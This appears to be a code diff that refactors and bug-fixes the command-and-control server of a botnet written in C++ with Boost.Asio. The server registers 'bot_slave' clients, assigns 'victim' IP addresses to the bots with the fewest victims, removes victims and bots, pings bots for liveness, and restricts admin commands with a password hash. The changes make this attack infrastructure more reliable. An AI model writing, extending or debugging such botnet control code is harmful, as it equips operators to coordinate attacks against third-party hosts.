@@ -1,7 +1,5 @@
 #include "server.h"
 
-#include <string>
-
 server::server(io::io_context& io_context, std::uint16_t port)
     : io_context_(io_context),
       acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
@@ -32,13 +30,15 @@ void server::start() {
 
 void server::accept() {
 	socket_.emplace(io_context_);
+
 	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
 }
 
 void server::onAccept(err error_code) {
-	size_t client_id = getClientId_();
+	int client_id = getClientId_();
+
 	clients_sessions_container_.insert(
-	    std::make_pair(client_id, std::unique_ptr<session>(new session(std::move(*socket_), io_context_, client_id))));
+	    std::make_pair(client_id, std::make_unique<session>(std::move(*socket_), io_context_, client_id)));
 	auto& client = clients_sessions_container_.find(client_id)->second;
 
 	PRINT("New client connected", "");
@@ -114,7 +114,7 @@ void server::handleGetClientsData(std::string& command, std::vector<std::string>
 	std::vector<std::string> parameters = {"[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Role]"};
 	std::queue<std::vector<std::string>> output_data;
 
-	int msgs_to_transfer = ceil((float)clients_data_container_.size() / max_bot_num_per_msg);
+	int msgs_to_transfer = std::ceil((float)clients_data_container_.size() / max_bot_num_per_msg);
 
 	for (auto& bot : clients_data_container_) {
 		if (bot_counter >= max_bot_num_per_msg || !bot_counter) {
@@ -166,17 +166,20 @@ void server::handleRemoveClient(std::string& command, std::vector<std::string>& 
 	if (params.size() < 2) return;
 	if (!checkHash_(params[0])) return;
 
+	if (clients_data_container_.find(params[1]) == clients_data_container_.end()) {
+		return;
+	}
+
 	auto ip = params[1];
-	auto id = clients_data_container_.find(client->ip_)->second.id;
+	auto id = clients_data_container_.find(ip)->second.id;
 
 	PRINT("REMOVING CLIENT: ", ip);
 	if (clients_sessions_container_.find(id) != clients_sessions_container_.end()) {
-		// TODO:@mark fix bug when removing bot from hashmap
-		// clients_sessions_container_.erase(id);
+		clients_sessions_container_.find(id)->second->stop();
+		clients_sessions_container_.erase(id);
 	}
 	if (clients_data_container_.find(ip) != clients_data_container_.end()) {
-		// TODO:@mark fix same bug possibly
-		// clients_data_container_.erase(ip);
+		clients_data_container_.erase(ip);
 	}
 }
 
@@ -191,8 +194,8 @@ void server::handleRemoveVictim(std::string& command, std::vector<std::string>& 
 		return;
 	}
 
-	size_t client_id_for_min_victims = -1;
-	std::string client_ip = "";
+	int client_id_for_min_victims = -1;
+	std::string client_ip;
 
 	for (const auto& cl : clients_data_container_) {
 		if (cl.second.status == "bot_slave" && std::find(cl.second.victims_vector.begin(), cl.second.victims_vector.end(),
@@ -228,8 +231,8 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 	PRINT("ADDING NEW VICTIM: ", victim_ip);
 
 	if (validate_ip(victim_ip)) {
-		size_t client_id_for_min_victims = -1;
-		std::string client_ip = "";
+		int client_id_for_min_victims = -1;
+		std::string client_ip;
 
 		for (const auto& cl : clients_data_container_) {
 			if (cl.second.status == "bot_slave") {
@@ -256,13 +259,18 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 
 void server::pingClients() {
 	std::string command = "[ARE_YOU_ALIVE]";
-	std::vector<std::pair<size_t, std::string>> inactive_clients;
+
 	for (auto& client : clients_sessions_container_) {
 		++client.second->inactive_timeout_count_;
 
 		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
 			PRINT("Disconnecting due to inactivity client:", client.second->ip_);
-			inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
+			client.second->stop();
+
+			clients_sessions_container_.erase(client.second->id_);
+			if (clients_data_container_.find(client.second->ip_) != clients_data_container_.end()) {
+				clients_data_container_.erase(client.second->ip_);
+			}
 
 		} else {
 			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
@@ -273,25 +281,31 @@ void server::pingClients() {
 		}
 	}
 
-	for (auto& client : inactive_clients) {
-		clients_sessions_container_.erase(client.first);
-		if (clients_data_container_.find(client.second) != clients_data_container_.end()) {
-			clients_data_container_.erase(client.second);
-		}
-	}
 	timer_.expires_at(timer_.expires_at() + interval_);
 	timer_.async_wait(boost::bind(&server::pingClients, this));
 }
 
-size_t server::getClientId_() {
-	std::hash<long int> hasher;
-	size_t id = hasher(
-	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
-	return id;
+int server::getClientId_() {
+	std::random_device rd;
+	std::mt19937::result_type seed = rd() ^ ((std::mt19937::result_type)std::chrono::duration_cast<std::chrono::seconds>(
+						     std::chrono::system_clock::now().time_since_epoch())
+						     .count() +
+						 (std::mt19937::result_type)std::chrono::duration_cast<std::chrono::microseconds>(
+						     std::chrono::high_resolution_clock::now().time_since_epoch())
+						     .count());
+
+	std::mt19937 gen(seed);
+	std::uniform_int_distribution<unsigned> distrib(1, INT_MAX);
+
+	int bot_id = (int)distrib(gen);
+	while (clients_sessions_container_.find(bot_id) != clients_sessions_container_.end()) {
+		bot_id = (int)distrib(gen);
+	}
+	return bot_id;
 }
 
 bool server::checkHash_(std::string& pass) {
-	if (pass == "") return false;
+	if (pass.empty()) return false;
 	std::hash<std::string> hasher;
 	return hasher(pass) == admin_hash_;
 }
@@ -325,7 +339,7 @@ bool server::validate_ip(std::string ip_string) {
 			return false;
 		}
 
-		for (std::string token : ip_tokens) {
+		for (const std::string& token : ip_tokens) {
 			if (token.size() > 3) {
 				return false;
 			}
